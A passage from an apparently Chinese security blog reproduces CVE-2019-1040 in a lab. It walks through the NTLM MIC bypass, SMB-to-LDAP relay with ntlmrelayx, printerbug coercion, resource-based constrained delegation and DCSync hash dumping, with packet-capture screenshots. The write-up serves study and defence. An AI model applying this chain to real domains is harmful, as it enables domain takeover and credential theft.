alt=\"umDVXt.png\"></p>\n<p>Clinet与Server交互流程图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDenP.png\" alt=\"umDenP.png\"></p>\n<p>Clinet与Server交互流量</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDm0f.png\" alt=\"umDm0f.png\"></p>\n<p>SMB认证协议流程</p>\n<p>为了确保恶意行为者不在传输过程中处理消息，在NTLM_AUTHENTICATE消息中添加了一个额外的MIC（消息完整性代码）字段。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDn78.png\" alt=\"umDn78.png\"></p>\n<p>存放于NTLM_AUTH中的MIC</p>\n<p>MIC是使用会话密钥应用于所有3个NTLM消息的串联的HMAC_MD5，该会话密钥仅对启动认证的帐户和目标服务器是已知的。</p>\n<p>因此，试图篡改其中一条消息的攻击者（例如，修改签名协商）将无法生成相应的MIC，这将导致攻击失败。</p>\n<h3 id=\"MIC校验绕过\"><a href=\"#MIC校验绕过\" class=\"headerlink\" title=\"MIC校验绕过\"></a>MIC校验绕过</h3><p>Microsoft服务器允许无MIC 的NTLM_AUTHENTICATE消息。</p>\n<p>如果想要将SMB身份验证中继到LDAP，并完成中继攻击，可以通过如下步骤：</p>\n<p>取消MIC校验以确保可以修改数据包中的内容：</p>\n<p>（1）从NTLM_AUTHENTICATE消息中删除MIC</p>\n<p>（2）从NTLM_AUTHENTICATE消息中删除版本字段（删除MIC字段而不删除版本字段将导致错误）。</p>\n<h3 id=\"LDAP签名绕过\"><a href=\"#LDAP签名绕过\" class=\"headerlink\" title=\"LDAP签名绕过\"></a>LDAP签名绕过</h3><p>在绕过MIC校验之后，可以修改NEGOTIATE_SIGN值以便将SMB流量顺利通过LDAP签名校验</p>\n<p>将NEGOTIATE_SIGN设置为notset以绕过LDAP验证</p>\n<p>（1）    取消设置NTLM_NEGOTIATE消息中的签名标志（NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN</p>\n<p>（2）    取消设置NTLM_AUTHENTICATE消息中的以下标志：NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION。</p>\n<h3 id=\"smb中继LDAP流程\"><a href=\"#smb中继LDAP流程\" class=\"headerlink\" title=\"smb中继LDAP流程\"></a>smb中继LDAP流程</h3><p>为了实现SMB中继LDAP流程，这里使用ntlmrelayx.py工具作为中继</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDKAS.jpg\" alt=\"umDKAS.jpg\"></p>\n<p>Ntlmrelayx中继流程如下：</p>\n<p>1、取消设置NTLM_NEGOTIATE消息中的签名标志（NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN）</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDMtg.png\" alt=\"umDMtg.png\"></p>\n<p>Exchange-Attacker-DC交互流量</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDQhQ.png\" alt=\"umDQhQ.png\"></p>\n<p>Exchange向Attacker发送NTLMSSP_NEGOTIATE包内容</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umD1pj.png\" alt=\"umD1pj.png\"></p>\n<p>Attacker将NTLMSSP_NEGOTIATE通过LDAP中继到DC包内容</p>\n<p>可见，在通过LDAP中继时，已经取消设置NTLM_NEGOTIATE消息中的签名标志（NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN）</p>\n<p>2、从NTLM_AUTHENTICATE消息中删除MIC以及版本字段</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umD31s.png\" alt=\"umD31s.png\"></p>\n<p>Exchange-Attacker-DC交互流量</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umD8cn.png\" alt=\"umD8cn.png\"></p>\n<p>Exchange向Attacker发送NTLMSSP_AUTH</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDYn0.png\" alt=\"umDYn0.png\"></p>\n<p>Attacker将NTLMSSP_AUTH通过LDAP中继到DC</p>\n<p>在通过LDAP中继时，NTLM_AUTHENTICATE消息中MIC以及版本字段已被删除</p>\n<p>3、取消设置NTLM_AUTHENTICATE消息中的以下标志：NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/um4w4I.png\" alt=\"um4w4I.png\"></p>\n<p>Exchange-Attacker-DC交互流量</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDtBV.png\" alt=\"umDtBV.png\"></p>\n<p>Exchange向Attacker发送NTLMSSP_AUTH包内容</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDN7T.png\" alt=\"umDN7T.png\"></p>\n<p>Attacker将NTLMSSP_AUTH通过LDAP中继到DC包内容</p>\n<p>在通过LDAP中继时，NTLM_AUTHENTICATE消息中的以下标志：NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION已经被设置为’NOT set’</p>\n<h2 id=\"0x04参考链接\"><a href=\"#0x04参考链接\" class=\"headerlink\" title=\"0x04参考链接\"></a><strong>0x04参考链接</strong></h2><hr>\n<p>[1] Exchange Server 2013 一步步安装图解</p>\n<p>[2] EnableLDAP over SSL (LDAPS) for Microsoft Active Directory servers</p>\n<p>[3] Windows Server 2012 R2 辅助域控制器搭建</p>\n<p>[4] 滥用基于资源约束委派来攻击Active Directory</p>\n<p>[5] AbusingS4U2Self: Another Sneaky Active Directory Persistence</p>\n<p>[6]利用CVE-2019-1040 - 结合RCE和Domain Admin的中继漏洞</p>\n<p>[7] 滥用Exchange：远离域管理员的一个API调用</p>\n<p>[8] The SYSTEM Account</p>\n<p>[9]Waggingthe Dog: Abusing Resource-Based Constrained Delegation to Attack ActiveDirectory</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>2019年6月，Microsoft发布了一条安全更新。该更新针对CVE-2019-1040漏洞进行修复。此次漏洞，攻击者可以通过中间人攻击，绕过NTLM MIC（消息完整性检查）保护，将身份验证流量中继到目标服务器。</p>\n<p>通过这种攻击使得攻击者在仅有一个普通域账号的情况下可以远程控制 Windows 域内的任何机器，包括域控服务器。</p>","more":"<h2 id=\"0x01-漏洞利用\"><a href=\"#0x01-漏洞利用\" class=\"headerlink\" title=\"0x01 漏洞利用\"></a><strong>0x01 漏洞利用</strong></h2><hr>\n<h3 id=\"攻击方式一：Exchange\"><a href=\"#攻击方式一：Exchange\" class=\"headerlink\" title=\"攻击方式一：Exchange\"></a><strong>攻击方式一：Exchange</strong></h3><p><strong>验证环境：</strong></p>\n<table>\n<thead>\n<tr>\n<th><strong>角色</strong></th>\n<th><strong>系统版本</strong></th>\n<th><strong>计算机名</strong></th>\n<th><strong>IP**</strong>地址**</th>\n<th><strong>域</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Attacker</td>\n<td>Ubuntu Server 18.04</td>\n<td>ubuntu</td>\n<td>192.168.123.69</td>\n<td></td>\n</tr>\n<tr>\n<td>DC</td>\n<td>Windows Server 2012 R2</td>\n<td>topsec-dc</td>\n<td>192.168.123.150</td>\n<td>test.local</td>\n</tr>\n<tr>\n<td>Exchange</td>\n<td>Windows Server 2012 R2</td>\n<td>topsec</td>\n<td>192.168.123.143</td>\n<td>test.local</td>\n</tr>\n</tbody></table>\n<p><strong>验证过程：</strong></p>\n<p>① 环境搭建</p>\n<ul>\n<li>安装配置域控制器</li>\n<li>安装配置Exchange Server，参考[1]</li>\n<li>在域中新建一个用于测试的账户test</li>\n</ul>\n<p>②执行ntlmrelayx.py脚本进行NTLM中继攻击，设置SMB服务器并将认证凭据中继到LDAP协议。其中–remove-mic选项用于清除MIC标志，–escalate-user用于提升指定用户权限。</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDaAU.png\" alt=\"umDaAU.png\"></p>\n<p>③ 执行printerbug.py脚本，触发SpoolService的bug。</p>\n<p><a href=\"https://imgchr.com/i/umDdNF\"><img src=\"https://s2.ax1x.com/2019/09/26/umDdNF.png\" alt=\"umDdNF.png\"></a></p>\n<p>④ SpoolService的bug导致Exchange服务器回连到ntlmrelayx.py，即将认证信息发送到ntlmrelayx.py。可以在下图中看到认证用户是TEST\\TOPSEC$。</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDwh4.png\" alt=\"umDwh4.png\"></p>\n<p>接着ntlmrelayx.py开始执行LDAP攻击，加上-debug选项后可以看到更详细的信息。</p>\n<p>首先，通过遍历验证中继帐户所在用户组及权限，发现当前账户可以创建用户、可以修改test.local域的ACL，因为域中的Exchange Windows Permissions用户组被允许修改ACL，如下图所示：</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDB9J.png\" alt=\"umDB9J.png\"></p>\n<p>该用户组下的成员正是中继的计算机账户TOPSEC</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDD39.png\" alt=\"umDD39.png\"></p>\n<p>因此脚本会首选修改ACL来提权，因为这相比创建用户的方式更隐秘一些。具体方式是通过LDAP修改域的安全描述符（Security Descriptor），可以在下面的数据包中看到ACL中每一条具体的访问控制条目（ACE，Access Control Entries）：</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDrcR.png\" alt=\"umDrcR.png\"></p>\n<p>⑤ 完成ACL的修改后，test就可以通过secretsdump.py的DCSync功能dump出所有密码哈希值：</p>\n<p><a href=\"https://imgchr.com/i/umDsj1\"><img src=\"https://s2.ax1x.com/2019/09/26/umDsj1.png\" alt=\"umDsj1.png\"></a></p>\n<h3 id=\"攻击方式二：Kerberos委派\"><a href=\"#攻击方式二：Kerberos委派\" class=\"headerlink\" title=\"攻击方式二：Kerberos委派\"></a>攻击方式二：Kerberos委派</h3><p><strong>验证环境：</strong></p>\n<table>\n<thead>\n<tr>\n<th><strong>角色</strong></th>\n<th><strong>系统版本</strong></th>\n<th><strong>计算机名</strong></th>\n<th><strong>IP**</strong>地址**</th>\n<th><strong>域</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Attacker</td>\n<td>Ubuntu Server 18.04</td>\n<td>ubuntu</td>\n<td>192.168.123.69</td>\n<td></td>\n</tr>\n<tr>\n<td>DC</td>\n<td>Windows Server 2012 R2</td>\n<td>topsec-dc</td>\n<td>192.168.123.212</td>\n<td>test.local</td>\n</tr>\n<tr>\n<td>SDC</td>\n<td>Windows Server 2012 R2</td>\n<td>topsec</td>\n<td>192.168.123.62</td>\n<td>test.local</td>\n</tr>\n</tbody></table>\n<p><strong>验证过程：</strong></p>\n<p>① 环境搭建</p>\n<ul>\n<li>安装配置域控制器，同时开启LDAPS支持，因为该攻击方式需要添加新的计算机账户，必须在LDAPS进行。开启方法参考[2]</li>\n<li>安装配置辅助域控制器，参考[3]</li>\n<li>在域中新建一个用于测试的账户topsec，一个域管理员admin</li>\n</ul>\n<p>② 和攻击方式一相同，执行ntlmrelayx.py本，使用–delegate-access选项，delegate-access选项将中继计算机帐户（这里即辅助域控制器）的访问权限委托给attacker。</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umD6nx.png\" alt=\"umD6nx.png\"></p>\n<p>③ attacker对辅助域控制器(SDC)执行printerbug.py脚本</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDcB6.png\" alt=\"umDcB6.png\"></p>\n<p>printerbug.py脚本执行成功后，将触发辅助域控制器(SDC)回连Attacker主机，回连使用的认证用户是辅助域控制器(SDC)本地计算机账户TEST/TOPSEC$。</p>\n<p>ntlmrelayx.py通过ldaps将该用户账户中继到域控服务器(DC)，因为这种攻击方式下所冒用的身份TEST/TOPSEC$并不在Exchange  Windows Permissions组内，不具有修改ACL权限，但是可以通过此身份在DC上添加一个新计算机账户（下图中EJETBTTB$）,  并修改其约束委派授权，授予它对受害计算机（辅助域控制器）的委派权限。</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDgHK.png\" alt=\"umDgHK.png\"></p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDWND.png\" alt=\"umDWND.png\"></p>\n<p>④使用getSP.py脚本，通过-impersonate参数模拟用户admin请求其票证，保存为ccache，admin用户为Domain Admins组的成员，具有对辅助域控制器(SDC)的管理与访问权限。</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDf4e.png\" alt=\"umDf4e.png\"></p>\n<p>⑤ 使用上一步骤中保存的Kerberos服务票证，我们可以在目标主机(SDC)上模拟admin身份，从而执行任何操作，例如使用secretsdump转储哈希值。通过secretsdump dump出所有密码哈希值：</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umD49H.png\" alt=\"umD49H.png\"></p>\n<h2 id=\"0x02-漏洞细节\"><a href=\"#0x02-漏洞细节\" class=\"headerlink\" title=\"0x02 漏洞细节\"></a><strong>0x02 漏洞细节</strong></h2><hr>\n<p>此次的攻击流程有如下两个方式：</p>\n<p>1、Exchange攻击流程：使用任何AD帐户，通过SMB连接到目标Exchange服务器，并触发SpoolService错误。目标服务器将通过SMB回连至攻击者主机，使用ntlmrelayx将SMB身份验证中继到LDAP。使用中继的LDAP身份验证，为攻击者帐户授予DCSync权限。攻击者帐户使用DCSync转储AD中的所有密码哈希值。</p>\n<p>2、Kerberos委派攻击流程：使用任何AD帐户，通过SMB连接到目标服务器，并触发SpoolService错误。目标服务器将通过SMB回连至攻击者主机，使用ntlmrelayx将SMB身份验证中继到LDAP。使用中继的LDAP身份验证，将目标服务器的基于资源的约束委派权限授予攻击者控制下的计算机帐户。攻击者作为受害者服务器上的任何用户进行身份验证。</p>\n<h3 id=\"Exchange攻击流程\"><a href=\"#Exchange攻击流程\" class=\"headerlink\" title=\"Exchange攻击流程\"></a>Exchange攻击流程</h3><p>下文出现的攻击流量图中,个角色与ip对应关系同上文<strong>验证环境</strong>搭建：</p>\n<table>\n<thead>\n<tr>\n<th><strong>角色</strong></th>\n<th><strong>系统版本</strong></th>\n<th><strong>计算机名</strong></th>\n<th><strong>IP地址</strong></th>\n<th><strong>域</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Attacker</td>\n<td>Ubuntu Server 18.04</td>\n<td>ubuntu</td>\n<td>192.168.123.69</td>\n<td></td>\n</tr>\n<tr>\n<td>DC</td>\n<td>Windows Server 2012 R2</td>\n<td>topsec-dc</td>\n<td>192.168.123.150</td>\n<td>test.local</td>\n</tr>\n<tr>\n<td>Exchange</td>\n<td>Windows Server 2012 R2</td>\n<td>topsec</td>\n<td>192.168.123.143</td>\n<td>test.local</td>\n</tr>\n</tbody></table>\n<p>下文标题内容，即为攻击流程，对应流程图中红框所示的流程</p>\n<p>如果对SMB协议不是很清楚的读者，可以先参考<strong>技术点分析-客户端与服务器端的SMB通信</strong>一节内容</p>\n<h4 id=\"attacker使用普通AD账户登陆Exchange\"><a href=\"#attacker使用普通AD账户登陆Exchange\" class=\"headerlink\" title=\"attacker使用普通AD账户登陆Exchange\"></a>attacker使用普通AD账户登陆Exchange</h4><p>在攻击的开始阶段，attacker需要确保拥有一个可使用的AD账号，这是满足触发SpoolService错误的必要条件。</p>\n<p>首先attacker利用已拥有的AD账号，连接到远程服务器的打印服务（spoolsv.exe）。</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDIgA.png\" alt=\"umDIgA.png\"></p>\n<p>Attacker通过SMB2协议登陆Exchange流程</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDojI.png\" alt=\"umDojI.png\"></p>\n<p>Attacker通过SMB2协议登陆Exchange流量</p>\n<p>成功的通过该阶段，就可以请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。</p>\n<h4 id=\"触发SpoolService错误\"><a href=\"#触发SpoolService错误\" class=\"headerlink\" title=\"触发SpoolService错误\"></a>触发SpoolService错误</h4><p>attacker通过Printerbug脚本，触发Exchange服务器SpoolService错误，强制Exchange服务器通过MS-RPRN RPC接口向attacker进行身份验证。具体细节见技术点分析一章中的SpoolService/printerbug</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umD7ut.png\" alt=\"umD7ut.png\"></p>\n<p>Attacker发送SpoolService错误payload流程</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDHDP.png\" alt=\"umDHDP.png\"></p>\n<p>Attacker通过printerbug向Exchange发送带有payload的流量</p>\n<h4 id=\"Exchange主机向Attacker发送Negotiate-Protocol-Request\"><a href=\"#Exchange主机向Attacker发送Negotiate-Protocol-Request\" class=\"headerlink\" title=\"Exchange主机向Attacker发送Negotiate Protocol Request\"></a>Exchange主机向Attacker发送Negotiate Protocol Request</h4><p>在触发SpoolService错误后，Exchange服务器向Attacker进行身份验证</p>\n<p>Exchange服务器向Attacker发送NegotiateProtocol Request，这是客户端向服务器发送第一个SMB请求，可参考技术点分析-客户端与服务器端的SMB通信</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDbHf.png\" alt=\"umDbHf.png\"></p>\n<p>Exchange向Attacker发送SMB协商请求流程</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDLE8.png\" alt=\"umDLE8.png\"></p>\n<p>Exchange向Attacker发送SMB协商请求流量</p>\n<p>在正常的业务场景中，用户想登陆并使用Exchange，往往需要向Exchange服务器发送SMB协商请求流量，以便验证身份并登陆。但由于SpoolService错误，在这里，Exchange向Attacker发送SMB协商请求流量，以便验证身份。这便造成了Attacker可以作为中间人身份中继此身份认证以冒充Exchange欺骗DC的机会。</p>\n<h4 id=\"Attacker将协商请求通过ldap中继到DC服务器\"><a href=\"#Attacker将协商请求通过ldap中继到DC服务器\" class=\"headerlink\" title=\"Attacker将协商请求通过ldap中继到DC服务器\"></a>Attacker将协商请求通过ldap中继到DC服务器</h4><p><img src=\"https://s2.ax1x.com/2019/09/26/umDOUS.png\" alt=\"umDOUS.png\"></p>\n<p>Attacker向DC中继Exchange的协商请求流程</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDX4g.png\" alt=\"umDX4g.png\"></p>\n<p>Attacker向DC中继Exchange的协商请求流量</p>\n<p>Attacker作为中间人，将Negotiate ProtocolRequest通过ldap请求中继到ad服务器</p>\n<p>在此步骤以及以下攻击流程中，有需要将SMB身份验证通过LDAP中继至DC的环节。由于NTLM协议的工作方式，无法将SMB流量直接通过LDAP中继，因此需要对流量进行修改，而需改流量，势必需要绕过MIC验证，此处便是本次漏洞的重点，详情见 技术点分析-MIC校验绕过部分</p>\n<h4 id=\"attacker向Exchange发送Negotiate-Protocol-Response\"><a href=\"#attacker向Exchange发送Negotiate-Protocol-Response\" class=\"headerlink\" title=\"attacker向Exchange发送Negotiate Protocol Response\"></a>attacker向Exchange发送Negotiate Protocol Response</h4><p><img src=\"https://s2.ax1x.com/2019/09/26/umDvCQ.png\" alt=\"umDvCQ.png\"></p>\n<p>Attacker向Exchange发送Negotiate Protocol Response流程</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDx3j.png\" alt=\"umDx3j.png\"></p>\n<p>Attacker向Exchange发送Negotiate Protocol Response流量</p>\n<h4 id=\"Exchange向attacker发送Session-Setup-Request\"><a href=\"#Exchange向attacker发送Session-Setup-Request\" class=\"headerlink\" title=\"Exchange向attacker发送Session Setup Request\"></a>Exchange向attacker发送Session Setup Request</h4><p><img src=\"https://s2.ax1x.com/2019/09/26/umDzgs.png\" alt=\"umDzgs.png\"></p>\n<p>Exchange向attacker发送Session Setup Request流程</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umDx3j.png\" alt=\"umDx3j.png\"></p>\n<p>Exchange向attacker发送Session Setup Request流量</p>\n<h4 id=\"Attacker向DC中继Session-Setup-Request\"><a href=\"#Attacker向DC中继Session-Setup-Request\" class=\"headerlink\" title=\"Attacker向DC中继Session Setup Request\"></a>Attacker向DC中继Session Setup Request</h4><p><img src=\"https://s2.ax1x.com/2019/09/26/umrSvn.png\" alt=\"umrSvn.png\"></p>\n<p>Attacker向DC中继Session Setup Request流程</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umr9uq.png\" alt=\"umr9uq.png\"></p>\n<p>Attacker向DC中继Session Setup Request流量</p>\n<p>Attacker将Exchange发送来的Session Setup Request 中继给DC， DC将包含 CHALLENGE的Response发送给Attacker</p>\n<h4 id=\"Attacker-向exchange发送Session-Setup-Response（CHALLENGE）\"><a href=\"#Attacker-向exchange发送Session-Setup-Response（CHALLENGE）\" class=\"headerlink\" title=\"Attacker 向exchange发送Session Setup Response（CHALLENGE）\"></a>Attacker 向exchange发送Session Setup Response（CHALLENGE）</h4><p><img src=\"https://s2.ax1x.com/2019/09/26/umrCD0.png\" alt=\"umrCD0.png\"></p>\n<p>Attacker 向exchange发送Session Setup Response流程</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umrPbV.png\" alt=\"umrPbV.png\"></p>\n<p>Attacker 向exchange发送Session Setup Response流量</p>\n<p>Attacker 将DC发出的包含challenge的Session Setup Response发送给exchange</p>\n<h4 id=\"exchange向Attacker发送包含了身份验证请求的Session-Setup\"><a href=\"#exchange向Attacker发送包含了身份验证请求的Session-Setup\" class=\"headerlink\" title=\"exchange向Attacker发送包含了身份验证请求的Session Setup\"></a>exchange向Attacker发送包含了身份验证请求的Session Setup</h4><p><img src=\"https://s2.ax1x.com/2019/09/26/umrFET.png\" alt=\"umrFET.png\"></p>\n<p>exchange向Attacker发送包含了身份验证请求的Session Setup Request流程</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umrPbV.png\" alt=\"umrPbV.png\"></p>\n<p>exchange向Attacker发送包含了身份验证请求的Session Setup流量</p>\n<p>我们可以看到上图中的认证用户为TEST\\TOPSEC$，而不是运行Exchange的SYSTEM账户，这是因为SYSTEM账户具有太高权限，如果用此帐户对网络资源进行身份验证，则会出现安全问题。所以当访问网络资源时，使用本地计算机的网络帐户对网络进行身份验，（形式为domain\\computername$，即TEST\\TOPSEC$）</p>\n<p>Exchange收到challenge后，向attacker发送包含了身份验证请求的Session Setup流量</p>\n<h4 id=\"Attacker向-DC中继含有Exchange的身份认证的Session-Setup-Request\"><a href=\"#Attacker向-DC中继含有Exchange的身份认证的Session-Setup-Request\" class=\"headerlink\" title=\"Attacker向 DC中继含有Exchange的身份认证的Session Setup Request\"></a>Attacker向 DC中继含有Exchange的身份认证的Session Setup Request</h4><p><img src=\"https://s2.ax1x.com/2019/09/26/umyB9g.png\" alt=\"umyB9g.png\"></p>\n<p>Attacker向 DC中继Session Setup Request流程</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umrkUU.png\" alt=\"umrkUU.png\"></p>\n<p>Attacker向 DC中继Session Setup Request流量</p>\n<p>DC认证通过Exchange身份，并向Attcker发送认证通过的Response。</p>\n<p>此时，DC对Attacker的身份验证结束，Attacker成功冒用Exchange身份。由于安装Exchange后，Exchange在Active  Directory域中具有高权限，Exchange的本地计算机账户TOPSEC$会被加入用户组Exchange Trusted  Subsystem，该用户组又隶属于Exchange Windows Permissions。ExchangeWindows Permissions组可以通过WriteDacl方式访问Active Directory中的Domain对象，该对象允许该组的任何成员修改域权限，从而可以修改当前域ACL达到提权目的。</p>\n<p>使用提权后的用户或计算机可以执行域控制器通常用于复制的同步操作，这允许攻击者同步ActiveDirectory中用户的所有哈希密码。</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umre29.png\" alt=\"umre29.png\"></p>\n<p>同步Active Directory中用户的所有哈希密码</p>\n<h3 id=\"Kerberos委派攻击流程\"><a href=\"#Kerberos委派攻击流程\" class=\"headerlink\" title=\"Kerberos委派攻击流程\"></a>Kerberos委派攻击流程</h3><p>下文出现的攻击流量图中,个角色与ip对应关系同上文<strong>验证环境</strong>搭建：</p>\n<table>\n<thead>\n<tr>\n<th>角色</th>\n<th>系统版本</th>\n<th>计算机名</th>\n<th>IP地址</th>\n<th>域</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Attacker</td>\n<td>Ubuntu Server 18.04</td>\n<td>ubuntu</td>\n<td>192.168.123.69</td>\n<td></td>\n</tr>\n<tr>\n<td>DC</td>\n<td>Windows Server 2012 R2</td>\n<td>topsec-dc</td>\n<td>192.168.123.212</td>\n<td>test.local</td>\n</tr>\n<tr>\n<td>SDC</td>\n<td>Windows Server 2012 R2</td>\n<td>topsec</td>\n<td>192.168.123.62</td>\n<td>test.local</td>\n</tr>\n</tbody></table>\n<p>Kerberos委派攻击流程与Exchange攻击利用，在DC对Attacker的身份验证结束之前的阶段是类似的。区别在于后续提权过程，下面介绍下Kerberos委派攻击后续攻击流程。</p>\n<p>在attacker冒用SDC身份后，由于SDC计算机身份没有修改访问控制列表(ACL)的权限，无法直接提权。而后续提权利用中的S4U2Self不适用于没有SPN的帐户。在域环境中，任何域用户都可以通过MachineAccountQuota创建新的计算机帐户，并为其设置SPN。Attacker通过此方式新建一个域中的计算机账号。这一过程通过LDAP实现并设置账户与密码，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/um5ZGt.png\" alt=\"um5ZGt.png\"></p>\n<p>Ntlmrelayx工具成功创建计算机账户</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/um46KS.png\" alt=\"um46KS.png\"></p>\n<p>DC上可见computers列表中新创建的名为EJETBTTB的计算机</p>\n<p>在域中新的计算机账户EJETBTTB(下图中的service A)建立成功后，后续攻击如下图攻击步骤</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umrmvR.png\" alt=\"umrmvR.png\"></p>\n<p>攻击步骤</p>\n<h4 id=\"攻击者为Service-A配置了基于资源的约束委派\"><a href=\"#攻击者为Service-A配置了基于资源的约束委派\" class=\"headerlink\" title=\"攻击者为Service A配置了基于资源的约束委派\"></a>攻击者为Service A配置了基于资源的约束委派</h4><p>由于通过S4U2Self请求到的TGSforwardable标志位为 Non-forwardable,这意味着该TGS服务票据是不可转发的，不可以在接下来的S4U2Proxy中进行转发。但是不可转发的TGS竟然可以用于基于资源的约束委派，S4U2Proxy会接收这张不可转发的TGS。由于我们拥有Service A的计算机账号以及密码，所以在这里可以为Service A到SDC配置了基于资源的约束委派，将默认的约束委派更改为基于资源的约束委派，以便后续攻击。</p>\n<h4 id=\"Service-A-调用S4U2Self向认证服务器-SDC-为admin请求访问自身的服务票据\"><a href=\"#Service-A-调用S4U2Self向认证服务器-SDC-为admin请求访问自身的服务票据\" class=\"headerlink\" title=\"Service A 调用S4U2Self向认证服务器(SDC)为admin请求访问自身的服务票据.\"></a>Service A 调用S4U2Self向认证服务器(SDC)为admin请求访问自身的服务票据.</h4><p><img src=\"https://s2.ax1x.com/2019/09/26/umIVw4.png\" alt=\"umIVw4.png\"></p>\n<p>通过国外安全研究员Elad  Shami的研究可知，无论服务账号的UserAccountControl属性是否被设为TrustedToAuthForDelegation，  服务自身都可以调用S4U2Self为任意用户请求访问自己的服务票据，也就是说，这里Service A  可以调用S4U2Self向SDC为admin用户申请可访问自身的服务票据.</p>\n<h4 id=\"SDC将为admin用户申请的访问ServiceA的TGS发送给Service-A\"><a href=\"#SDC将为admin用户申请的访问ServiceA的TGS发送给Service-A\" class=\"headerlink\" title=\"SDC将为admin用户申请的访问ServiceA的TGS发送给Service A\"></a>SDC将为admin用户申请的访问ServiceA的TGS发送给Service A</h4><p><img src=\"https://s2.ax1x.com/2019/09/26/umsnJg.png\" alt=\"umsnJg.png\"></p>\n<h4 id=\"Service-A通过S4U2Proxy-转发TGS，并为admin申请访问SDC票据\"><a href=\"#Service-A通过S4U2Proxy-转发TGS，并为admin申请访问SDC票据\" class=\"headerlink\" title=\"Service A通过S4U2Proxy 转发TGS，并为admin申请访问SDC票据\"></a>Service A通过S4U2Proxy 转发TGS，并为admin申请访问SDC票据</h4><p><img src=\"https://s2.ax1x.com/2019/09/26/umsuWQ.png\" alt=\"umsuWQ.png\"></p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><h4 